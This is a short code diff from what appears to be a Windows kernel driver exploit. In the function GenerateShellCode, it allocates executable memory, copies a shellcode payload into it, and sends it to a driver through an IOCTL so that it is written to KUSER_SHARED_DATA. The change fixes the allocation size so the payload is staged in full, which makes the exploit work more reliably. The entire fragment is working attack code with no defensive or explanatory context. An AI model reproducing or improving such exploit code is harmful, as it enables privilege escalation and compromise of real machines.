@@ -296,12 +296,15 @@ void *GenerateShellCode(HANDLE driverHandle)
 {
     int shellCodeLen=0;
     void *shellcode=NULL;
-    
+    size_t payloadSize = 0;
+
+    payloadSize = strlen( (const char*) payload);
+
     printf("[+] Shellcode is located at %p\n",KUSER_SHARED_DATA );
 
-    shellcode= VirtualAlloc(0,sizeof(void*), 0x3000,0x40); 
+    shellcode= VirtualAlloc(0,payloadSize, 0x3000,0x40); 
 
-    RtlMoveMemory(shellcode,payload,strlen( (const char*) payload));
+    RtlMoveMemory(shellcode,payload,payloadSize);
 
     SendToDriver(driverHandle,0x0022200B,(void*)shellcode,(void*)KUSER_SHARED_DATA);
 
